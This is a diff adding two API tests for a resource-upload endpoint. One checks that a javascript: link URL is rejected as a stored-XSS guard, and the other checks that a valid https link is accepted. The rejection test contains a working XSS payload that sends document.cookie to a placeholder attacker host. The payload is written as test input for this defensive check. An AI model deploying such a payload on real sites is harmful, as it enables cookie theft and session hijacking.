@@ -119,4 +119,40 @@ describe('Resource API & Global Search Guest Gate Tests', () => {
     expect(res.body.data).toHaveLength(1);
     expect(mockGetVerifiedResourcesFeed).toHaveBeenCalled();
   });
+
+  test('rejects a javascript: URL submitted as a link resource (stored XSS guard)', async () => {
+    console.log('\n───────────────────────────────────────────────────────');
+    console.log('[TEST] POST /api/v1/resources › rejects javascript: link URL');
+
+    isAuthenticated = true;
+
+    const res = await request.post('/api/v1/resources').send({
+      title: 'Malicious link',
+      description: 'test',
+      linkUrl: "javascript:fetch('https://evil.example/steal?c='+document.cookie)",
+    });
+
+    console.log(`[TEST RESULT] Status: ${res.status}`);
+    expect(res.status).toBe(400);
+    expect(res.body.success).toBe(false);
+    expect(mockUploadResource).not.toHaveBeenCalled();
+  });
+
+  test('accepts a valid https link resource', async () => {
+    console.log('\n───────────────────────────────────────────────────────');
+    console.log('[TEST] POST /api/v1/resources › accepts valid https link URL');
+
+    isAuthenticated = true;
+    mockUploadResource.mockResolvedValueOnce({ _id: 'res_link_1', fileType: 'link' });
+
+    const res = await request.post('/api/v1/resources').send({
+      title: 'Useful link',
+      description: 'test',
+      linkUrl: 'https://example.com/notes.pdf',
+    });
+
+    console.log(`[TEST RESULT] Status: ${res.status}`);
+    expect(res.status).toBe(201);
+    expect(mockUploadResource).toHaveBeenCalled();
+  });
 });
